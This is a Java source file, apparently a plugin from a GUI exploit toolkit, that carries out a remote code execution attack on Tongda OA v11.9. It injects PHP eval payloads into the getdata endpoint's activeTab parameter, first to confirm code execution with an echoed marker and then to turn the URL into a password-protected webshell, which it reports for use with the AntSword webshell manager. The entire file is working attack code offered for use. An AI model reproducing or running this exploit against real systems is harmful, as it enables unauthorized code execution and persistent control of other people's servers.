package exp.oa.tongdaoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.Base64Utils;
import utils.HttpTools;
import utils.Response;

import java.util.Date;
import java.util.HashMap;

public class tongda_v119_getdata_RCE implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url,textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url,TextArea textArea){
        long tt = (new Date()).getTime();
        String flag = tt+"";
        String poc = Base64Utils.base64Encode("echo "+flag+";");

        Response response = HttpTools.get(url + "/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22"+poc+"%22)))%3B/*&id=19&module=Carouselimage", new HashMap<String, String>(), "utf-8");
        if(response.getCode() == 200 && response.getText().contains(flag)){
            Platform.runLater(()-> {
                textArea.appendText("\n [ tongda_v119_getdata_RCE ]");
                textArea.appendText("\n echo执行成功: "+flag);
                textArea.appendText("\n CMD处设置密码，默认蚁剑");
                textArea.appendText("\n ");
            });
            return true;
        }else {
            Platform.runLater(()->{
                textArea.appendText("\n ");
            });
            return false;
        }
    }
    private Boolean attcmd(String url,String pass,TextArea textArea,TextArea textArea_cmd){

        Response response = HttpTools.get(url + "/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(($_POST["+pass+"])))%3B/*&id=19&module=Carouselimage", new HashMap<String, String>(), "utf-8");
        if(response.getCode() == 200 && response.getText().contains("page_total")){
            Platform.runLater(()-> {
                textArea.appendText("\n webshell访问成功");
                textArea_cmd.appendText("\n "+ url + "/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(($_POST["+pass+"])))%3B/*&id=19&module=Carouselimage");
                textArea_cmd.appendText("\n 蚁剑密码: "+pass);
            });
            return true;
        }else {
            Platform.runLater(()->{
                textArea.appendText("\n webshell访问失败");
            });
            return false;
        }
    }
}
